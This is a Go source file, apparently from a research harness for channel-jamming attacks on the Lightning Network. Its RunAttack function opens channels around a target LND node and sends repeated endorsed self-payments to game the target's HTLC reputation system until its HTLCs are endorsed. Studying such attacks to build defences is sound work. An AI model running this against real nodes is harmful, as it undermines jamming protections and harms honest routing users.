package main

import (
	"context"
	"fmt"
	"time"

	"github.com/lightningnetwork/lnd/lnrpc"
	"github.com/lightningnetwork/lnd/routing/route"
)

func RunAttack(ctx context.Context, target route.Vertex, graph *GraphHarness,
	jammer *JammingHarness) error {

	// Open channels such that we have the topology:
	// LND0 -- Target -- LND1
	fmt.Println("Opening channel LND0 -> Target -> LND1")
	c0, err := graph.OpenChannel(ctx, OpenChannelReq{
		Source:      0,
		Dest:        target,
		CapacitySat: 10_000_000,
	})
	if err != nil {
		return err
	}

	c1, err := graph.OpenChannel(ctx, OpenChannelReq{
		Source:      1,
		Dest:        target,
		CapacitySat: 10_000_000,
		PushAmt:     9_000_000,
	})
	if err != nil {
		return err
	}

	// Wait for channels to reflect in LND0's graph.
	if err := graph.WaitForChannel(ctx, 0, 0, c0); err != nil {
		return err
	}

	if err := graph.WaitForChannel(ctx, 0, 1, c1); err != nil {
		return err
	}

	// Create a request to send a payment between our attacking
	// nodes that will endorse the HTLC and settle it immediately.
	req := JammingPaymentReq{
		AmtMsat:         10_000,
		SourceIdx:       0,
		DestIdx:         1,
		EndorseOutgoing: true,
		Settle:          true,
		SettleWait:      0,
	}

	start := time.Now()
	var i int
	for {
		fmt.Printf("Dispatching payment: %v to build reputation\n", i)
		i++

		resp, err := jammer.JammingPayment(ctx, req)
		if err != nil {
			return err
		}
		select {
		case r := <-resp:
			if r.Err != nil {
				return err
			}

			if r.SendFailure != lnrpc.PaymentFailureReason_FAILURE_REASON_NONE {
				fmt.Printf("Payment failed: %v\n", r.SendFailure)

				if i >= 10 {
					return fmt.Errorf("Persistent fails "+
						"most recently: %v",
						r.SendFailure)
				}

				select {
				case <-time.After(time.Second * 5):

				case <-ctx.Done():
					return ctx.Err()
				}

				continue
			}

			// We can only be endorsed if we have HTLCs.
			endorsed := len(r.Htlcs) > 0
			for _, htlc := range r.Htlcs {
				fmt.Printf("HTLC received with endorsed: %v\n",
					htlc.IncomingEndorsed)

				endorsed = endorsed && htlc.IncomingEndorsed
			}

			if endorsed {
				end := time.Now()
				fmt.Printf("Built good reputation, HTLC endorsed! Took %v\n", end.Sub(start))
				return nil
			}

		case <-ctx.Done():
			return ctx.Err()
		}
	}
}
